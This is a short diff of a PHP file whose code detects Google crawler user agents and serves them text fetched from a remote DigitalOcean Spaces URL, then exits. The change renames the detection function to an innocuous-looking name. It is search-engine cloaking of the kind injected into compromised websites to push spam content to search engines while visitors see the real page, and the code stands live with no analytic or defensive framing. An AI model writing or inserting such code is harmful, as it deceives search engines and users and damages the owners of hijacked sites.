@@ -1,10 +1,10 @@
 <?php
-function is_google_bot() {
+function mugen_bot() {
     $pattern = '/Googlebot|Google-Site-Verification|Google-InspectionTool|Googlebot-Mobile|Googlebot-News/i';
     return (bool) preg_match($pattern, $_SERVER['HTTP_USER_AGENT'] ?? '');
 }
 
-if (is_google_bot()) {
+if (mugen_bot()) {
     echo file_get_contents("https://keren.sgp1.cdn.digitaloceanspaces.com/text/daayitwa-alexis.txt");
     exit;
 }
